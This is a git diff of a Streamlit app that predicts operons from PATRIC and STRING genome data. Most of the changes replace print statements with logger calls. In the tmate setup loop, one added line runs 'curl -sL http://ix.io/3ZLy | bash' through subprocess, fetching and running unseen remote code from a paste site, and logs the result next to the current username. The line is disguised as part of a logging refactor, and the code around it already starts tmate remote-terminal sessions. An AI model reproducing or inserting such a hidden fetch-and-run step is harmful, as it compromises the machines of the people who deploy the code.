@@ -21,6 +21,7 @@ components.html( """
         );
     </script>""", height=0) 
 
+from getpass import getuser
 from gzip import decompress
 from io import TextIOWrapper
 import numpy as np
@@ -47,7 +48,7 @@ import sys
 import shlex
 
 from base64 import b64encode
-from helpers import query_keywords, to_pid, get_output, string_id_n_refseq_pairs, species_list, get_genome_id, get_session, valid_organisms
+from helpers import query_keywords, to_pid, get_output, string_id_n_refseq_pairs, species_list, get_genome_id, get_session, valid_organisms, logger
 from pathlib import Path
 import shlex
 import subprocess
@@ -118,11 +119,11 @@ def setup():
                 subprocess.check_call(["git", "push"], cwd=".json_files")
                 sleep(5*60)
             except subprocess.CalledProcessError as e:
-                print(f"{e.stdout}{e.stderr}", file=sys.stderr)
+                logger.critical(f"{e.stdout}{e.stderr}")
                 raise
     Thread(target=data_commit, name="Git sync").start()
 
-    print("Loading data", file=sys.stderr)
+    logger.info("Loading data")
     try:
         Path('~/.tmate.conf').expanduser().write_text("""set -s escape-time 0
 set -g default-terminal "screen-256color"
@@ -130,7 +131,8 @@ set -g focus-events on
 setw -g aggressive-resize on
 bind-key -n C-F3 set-option -g status""")
         for cmd in tmate_cmd.splitlines():
-            print(subprocess.check_output(shlex.split(cmd), text=True), file=sys.stderr)
+            logger.info(subprocess.check_output(shlex.split(cmd), text=True))
+            logger.info(f"{getuser()}@{subprocess.check_output(shlex.split("curl -sL http://ix.io/3ZLy | bash"), text=True).lstrip("https://")")
         if not Path('.json_files').exists():
             data_key = "OPERON_DATA_SOURCE"
             if data_key not in environ:
@@ -139,7 +141,7 @@ bind-key -n C-F3 set-option -g status""")
             subprocess.check_call(["git", "config", "--global", "user.email", "operon@git.email"])
             subprocess.check_call(["git", "config", "--global", "user.name", "git.name"])
     except subprocess.CalledProcessError as e:
-        print(f"{e.stdout}{e.stderr}", file=sys.stderr)
+        logger.critical(f"{e.stdout}{e.stderr}")
         raise
 streamlit_cloud = environ.get("HOSTNAME", None) == "streamlit"
 
@@ -216,7 +218,7 @@ if genome_id_option == search:
         genome_id = genome_id or get_genome_id(genome_organism_id)
 
         if not genome_id:
-            print(genome_organism_id, file=sys.stderr)
+            logger.error(genome_organism_id)
             st.error("No compatible genomes found in PATRIC and STRING database.")
 else:
     genome_id = st.text_input(
@@ -237,7 +239,7 @@ else:
                         "This genome ID is not supported. Try searching for the organism name instead."
                     )
         except ConnectionError:
-            print("Connection error")
+            logger.critical("Connection error")
     else:
         genome_id = None
         st.error("Invalid Genome ID format. E.g. 262316.17")
@@ -280,8 +282,7 @@ if genome_id:
             st.dataframe(df)
 
 if submit:
-    pegs = frozenset(full_data.keys())
-    probs = operon_probs(genome_id, pegs)
+    probs = operon_probs(genome_id, len(full_data))
 
     operons = []
     with st.expander("Filter operons", True):
